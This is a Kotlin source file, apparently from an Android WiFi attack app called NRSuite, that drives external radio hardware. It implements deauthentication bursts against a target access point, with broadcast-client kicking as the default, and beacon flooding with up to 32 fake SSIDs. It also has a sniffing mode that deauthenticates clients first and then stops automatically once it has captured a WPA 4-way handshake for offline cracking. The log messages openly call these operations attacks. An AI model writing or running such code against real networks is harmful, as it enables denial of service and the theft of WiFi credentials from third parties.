package com.swp81x.nrsuite

import com.swp81x.nrsuite.core.eapol.EapolHandshake
import com.swp81x.nrsuite.core.eapol.EapolParser
import com.swp81x.nrsuite.core.history.HistoryLevel
import com.swp81x.nrsuite.core.pcap.PcapWriter
import com.swp81x.nrsuite.core.session.NrSession
import com.swp81x.nrsuite.core.sniff.SniffRequest
import java.io.IOException
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import kotlinx.coroutines.flow.update
import org.json.JSONObject

private const val PREF_BEACON_LISTS = "beacon_lists"

// WiFi scan, deauth, beacon, sniff capture, and related helpers.

internal fun MainViewModel.saveBeaconListImpl(name: String, ssids: List<String>) {
    val cleanName = name.trim()
    if (cleanName.isBlank()) return
    val cleanSsids = ssids.map { it.trim() }.filter { it.isNotEmpty() }.distinct()
    _beaconListMap.update { it + (cleanName to cleanSsids) }
    persistBeaconListsImpl()
    appendLog("已保存 Beacon SSID 列表 '$cleanName' (${cleanSsids.size} 个 SSID)。")
}

internal fun MainViewModel.deleteBeaconListImpl(name: String) {
    _beaconListMap.update { it - name }
    persistBeaconListsImpl()
    appendLog("已删除 Beacon SSID 列表 '$name'。")
}

internal fun MainViewModel.loadBeaconListsImpl() {
    val raw = preferences.getString(PREF_BEACON_LISTS, null) ?: return
    runCatching {
        val json = JSONObject(raw)
        val map = mutableMapOf<String, List<String>>()
        json.keys().forEach { key ->
            val array = json.optJSONArray(key) ?: return@forEach
            val list = mutableListOf<String>()
            for (i in 0 until array.length()) {
                val value = array.optString(i)
                if (value.isNotBlank()) list += value
            }
            map[key] = list
        }
        _beaconListMap.value = map
    }
}

internal fun MainViewModel.persistBeaconListsImpl() {
    val json = JSONObject()
    _beaconListMap.value.forEach { (name, ssids) ->
        val array = org.json.JSONArray()
        ssids.forEach { array.put(it) }
        json.put(name, array)
    }
    preferences.edit().putString(PREF_BEACON_LISTS, json.toString()).apply()
}

internal fun MainViewModel.scanWifiImpl() {
    val activeSession = session
    if (activeSession == null) {
        appendLog("扫描前请先连接设备。")
        return
    }
    if (_scanning.value) return
    if (!ensureRadioIdle("WiFi 扫描")) return

    _networks.value = emptyList()
    _deauthDetectorTargets.value = emptyList()
    _scanning.value = true
    scope.launch {
        appendLog("正在启动 WiFi 扫描...")
        val count = activeSession.scanWifi()
        _scanning.value = false
        when {
            count == null -> appendLog("WiFi 扫描超时。")
            count < 0 -> appendLog("WiFi 扫描失败。")
            else -> {
                appendLog("WiFi 扫描完成：发现 $count 个网络。")
                addHistory("scan", "WiFi 扫描完成：发现 $count 个网络", HistoryLevel.SUCCESS)
            }
        }
    }
}

internal fun MainViewModel.startDeauthImpl(bssid: String, channel: Int, client: String, count: Int, duration: Int, intervalMs: Int) {
    val activeSession = session
    if (activeSession == null) {
        appendLog("发送 Deauth 帧前请先连接设备。")
        return
    }
    if (_deauthRunning.value) return
    if (!ensureRadioIdle("Deauth 突发攻击")) return
    this.stopLocalPortalImpl()

    val cleanBssid = bssid.trim().uppercase()
    val cleanClient = client.trim().ifBlank { "FF:FF:FF:FF:FF:FF" }.uppercase()
    if (!MainViewModel.MAC_PATTERN.matches(cleanBssid)) {
        appendLog("无效的目标 BSSID：$cleanBssid")
        return
    }
    if (!MainViewModel.MAC_PATTERN.matches(cleanClient)) {
        appendLog("无效的客户端 MAC 地址：$cleanClient")
        return
    }

    // The firmware's DEAUTH handler calls radioIdle(), so stop local
    // companion tasks before issuing the burst.
    beaconStatusJob?.cancel()
    beaconStatusJob = null
    _beaconRunning.value = false
    if (_sniffing.value) {
        _sniffing.value = false
        pcapJob?.cancel()
        pcapJob = null
        scope.launch(Dispatchers.IO) {
            runCatching { pcapWriter?.close() }
            pcapWriter = null
        }
    }

    _deauthSent.value = 0
    _deauthTarget.value = cleanBssid
    _deauthChannel.value = channel.coerceIn(1, 13)
    _deauthRunning.value = true
    updateForegroundService()

    scope.launch {
        val countText = if (count <= 0) "固件默认值" else count.toString()
        appendLog("正在启动 Deauth 突发攻击：目标 $cleanBssid (信道 $channel, 客户端 $cleanClient, 次数 $countText)。")
        val args = JSONObject().apply {
            put("bssid", cleanBssid)
            put("client", cleanClient)
            put("channel", channel.coerceIn(1, 13))
            put("count", count.coerceAtLeast(0))
            put("duration", duration.coerceAtLeast(0))
            put("deauth_interval_ms", intervalMs.coerceIn(10, 10_000))
            put("reason", 7)
        }
        val response = activeSession.sendCommand("DEAUTH", args, timeoutMs = 60_000)
        _deauthRunning.value = false
        updateForegroundService()
        if (response?.optBoolean("ok") == true) {
            appendLog("Deauth 突发攻击完成。")
            addHistory("deauth", "针对 $cleanBssid 的 Deauth 突发攻击完成", HistoryLevel.SUCCESS)
        } else {
            appendLog("Deauth 请求失败：${response?.optString("msg") ?: "超时"}")
        }
    }
}

internal fun MainViewModel.startBeaconImpl(ssids: List<String>, channel: Int, intervalMs: Int, hidden: Boolean, randomBssid: Boolean) {
    val activeSession = session
    if (activeSession == null) {
        appendLog("启动 Beacon 广播前请先连接设备。")
        return
    }
    if (_beaconRunning.value) return
    if (!ensureRadioIdle("Beacon 广播")) return
    this.stopLocalPortalImpl()

    val cleanSsids = ssids.map { it.trim() }.filter { it.isNotEmpty() }.distinct()
    if (cleanSsids.isEmpty()) {
        appendLog("至少需要一个 SSID。")
        return
    }
    if (cleanSsids.size > 32) {
        appendLog("固件最多支持 32 个 SSID。")
        return
    }

    scope.launch {
        appendLog("正在启动 Beacon 广播 (${cleanSsids.size} 个 SSID，信道 $channel)...")
        val args = JSONObject().apply {
            put("ssids", cleanSsids.joinToString("\n"))
            put("channel", channel.coerceIn(1, 13))
            put("interval_ms", intervalMs.coerceIn(10, 2000))
            put("hidden", hidden)
            put("random_bssid", randomBssid)
        }
        val response = activeSession.sendCommand("START_BEACON", args, timeoutMs = 10_000)
        if (response?.optBoolean("ok") == true) {
            _beaconRunning.value = true
            updateForegroundService()
            _beaconSent.value = 0
            _beaconSsidCount.value = response.optInt("ssids", cleanSsids.size)
            _beaconChannel.value = response.optInt("channel", channel)
            appendLog("Beacon 广播已启动。")
            addHistory("beacon", "Beacon 广播已启动 (${cleanSsids.size} 个 SSID)", HistoryLevel.SUCCESS)
            startBeaconStatusPollingImpl(activeSession)
        } else {
            appendLog("启动 Beacon 广播失败：${response?.optString("msg") ?: "超时"}")
        }
    }
}

internal fun MainViewModel.stopBeaconImpl() {
    if (!_beaconRunning.value) return
    beaconStatusJob?.cancel()
    beaconStatusJob = null
    _beaconRunning.value = false
    updateForegroundService()

    val activeSession = session
    scope.launch {
        val response = activeSession?.sendCommand("STOP_BEACON", timeoutMs = 6_000)
        if (response?.optBoolean("ok") == true) {
            _beaconSent.value = response.optInt("sent", _beaconSent.value)
            _beaconSsidCount.value = response.optInt("ssids", _beaconSsidCount.value)
            appendLog("Beacon 广播已停止。已发送帧数：${_beaconSent.value}。")
            addHistory("beacon", "Beacon 广播已停止；已发送 ${_beaconSent.value} 帧", HistoryLevel.SUCCESS)
        } else {
            appendLog("已发送 Beacon 停止请求，但设备未确认。")
        }
    }
}

internal fun MainViewModel.startBeaconStatusPollingImpl(activeSession: NrSession) {
    beaconStatusJob?.cancel()
    beaconStatusJob = scope.launch {
        while (isActive && _beaconRunning.value) {
            delay(2_000)
            val response = activeSession.sendCommand("BEACON_STATUS", timeoutMs = 4_000) ?: continue
            if (response.optBoolean("ok")) {
                _beaconRunning.value = response.optBoolean("active", _beaconRunning.value)
                _beaconSent.value = response.optInt("sent", _beaconSent.value)
                _beaconSsidCount.value = response.optInt("ssids", _beaconSsidCount.value)
                _beaconChannel.value = response.optInt("channel", _beaconChannel.value)
            }
        }
    }
}

internal fun MainViewModel.startSniffImpl(request: SniffRequest) {
    val activeSession = session
    if (activeSession == null) {
        appendLog("嗅探前请先连接设备。")
        return
    }
    if (_sniffing.value) return
    if (!ensureRadioIdle("数据包嗅探器")) return
    beaconStatusJob?.cancel()
    beaconStatusJob = null
    _beaconRunning.value = false
    this.stopLocalPortalImpl()

    val captureName = "capture_${System.currentTimeMillis()}.pcap"
    val exportUri = _exportDirectory.value
    if (exportUri == null) {
        _requiresRootDirectory.value = true
        appendLog("开始抓包前请先选择 NRSuite 根目录。")
        return
    }
    val writerResult = runCatching {
        val pcapDir = ensureChildDirectory(exportUri, "Pcap")
        val pcapDirUri = pcapDir?.uri ?: exportUri
        val documentUri = createPcapDocumentInDirectory(pcapDirUri, captureName)
        val outputStream = app.contentResolver
            .openOutputStream(documentUri, "wt")
            ?: throw IOException("无法打开导出文件")
        val displayName = displayNameForTreeUri(exportUri)
        PcapWriter(outputStream, closeOutput = true) to "$displayName/Pcap/$captureName"
    }
    val (writer, captureDisplayPath) = writerResult.getOrElse { error ->
        appendLog("无法创建抓包输出文件：${error.message}")
        return
    }

    pcapWriter = writer
    _capturePath.value = captureDisplayPath
    _sniffPacketCount.value = 0
    _sniffHandshake.value = EapolHandshake()
    _sniffing.value = true
    updateForegroundService()

    appendLog("抓包文件：$captureDisplayPath")

    val eapolState = EapolHandshake()
    var eapolStopRequested = false
    pcapJob = scope.launch(Dispatchers.IO) {
        activeSession.pcap.collect { frame ->
            val matchesTarget = !request.targetNetworkOnly ||
                frameMatchesBssidImpl(frame, request.targetBssid)
            if (matchesTarget) {
                try {
                    writer.writePacket(frame)
                    _sniffPacketCount.update { it + 1 }
                } catch (t: Throwable) {
                    appendLog("PCAP 写入错误：${t.message}")
                }
            }

            if (request.eapolOnly) {
                EapolParser.parse(frame, eapolState)
                _sniffHandshake.value = eapolState.copy()
                val targetMatches = MainViewModel.MAC_PATTERN.matches(request.targetBssid.trim().uppercase())
                if (!eapolStopRequested && targetMatches && eapolState.isComplete) {
                    eapolStopRequested = true
                    appendLog("[+] 成功捕获到有效的 4 次握手包！")
                    stopSniffImpl()
                }
            }
        }
    }

    scope.launch {
        if (request.deauthBeforeCapture) {
            val cleanBssid = request.targetBssid.trim().uppercase()
            if (MainViewModel.MAC_PATTERN.matches(cleanBssid)) {
                val cleanClient = request.client.trim()
                    .ifBlank { "FF:FF:FF:FF:FF:FF" }
                    .uppercase()
                appendLog("抓包前正在发送 Deauth 突发攻击...")
                val deauthResponse = activeSession.sendCommand(
                    "DEAUTH",
                    JSONObject().apply {
                        put("bssid", cleanBssid)
                        put("client", cleanClient)
                        put("channel", request.channel.coerceIn(1, 13))
                        put("count", request.deauthCount.coerceAtLeast(0))
                        put("deauth_interval_ms", request.deauthIntervalMs.coerceIn(10, 10_000))
                        put("reason", 7)
                    },
                    timeoutMs = 20_000,
                )
                if (deauthResponse?.optBoolean("ok") != true) {
                    appendLog("Deauth 突发攻击失败或超时；继续执行抓包。")
                }
            } else {
                appendLog("跳过 Deauth 触发：无效的目标 BSSID。")
            }
        }

        val cleanFilterBssid = request.targetBssid.trim().uppercase()
        val args = JSONObject().apply {
            put("mode", if (request.fixedMode) "fixed" else "hop")
            put("channel", request.channel.coerceIn(1, 13))
            put("interval_ms", request.intervalMs.coerceIn(50, 2_000))
            if (request.eapolOnly) {
                put("eapol_only", true)
            }
            if (MainViewModel.MAC_PATTERN.matches(cleanFilterBssid)) {
                put("bssid", cleanFilterBssid)
            }
        }
        val response = activeSession.sendCommand("START_SNIFF", args, timeoutMs = 12_000)
        if (response?.optBoolean("ok") == true) {
            val message = if (request.fixedMode) {
                "已在信道 ${request.channel.coerceIn(1, 13)} 上启动抓包。"
            } else {
                "已启动跳频抓包。"
            }
            appendLog(message)
            addHistory("sniff", message, HistoryLevel.SUCCESS)
        } else {
            appendLog("启动抓包失败：${response?.optString("msg") ?: "超时"}")
            stopSniffImpl()
        }
    }
}

internal fun MainViewModel.stopSniffImpl() {
    if (!_sniffing.value) return
    _sniffing.value = false
    updateForegroundService()

    pcapJob?.cancel()
    pcapJob = null

    val activeSession = session
    scope.launch {
        val response = activeSession?.sendCommand("STOP_SNIFF", timeoutMs = 6_000)
        if (response != null) {
            appendLog(
                "抓包已停止：已捕获=${response.optInt("captured")}，" +
                    "已发送=${response.optInt("sent")}，已丢弃=${response.optInt("dropped")}"
            )
        }
        withContext(Dispatchers.IO) {
            runCatching { pcapWriter?.close() }
        }
        pcapWriter = null
        _capturePath.value?.let {
            appendLog("抓包已保存：$it")
            addHistory("sniff", "抓包已保存：$it", HistoryLevel.SUCCESS)
        }
    }
}

internal fun MainViewModel.frameMatchesBssidImpl(frame: ByteArray, bssid: String): Boolean {
    val parts = bssid.trim().uppercase().split(":")
    if (parts.size != 6) return false
    val target = ByteArray(6) { index ->
        parts[index].toIntOrNull(16)?.toByte() ?: return false
    }
    if (frame.size < 8) return false
    val radiotapLength = (frame[2].toInt() and 0xFF) or
        ((frame[3].toInt() and 0xFF) shl 8)
    val macBase = radiotapLength
    if (frame.size < macBase + 22) return false
    for (offset in intArrayOf(4, 10, 16)) {
        var matches = true
        for (i in 0 until 6) {
            if (frame[macBase + offset + i] != target[i]) {
                matches = false
                break
            }
        }
        if (matches) return true
    }
    return false
}
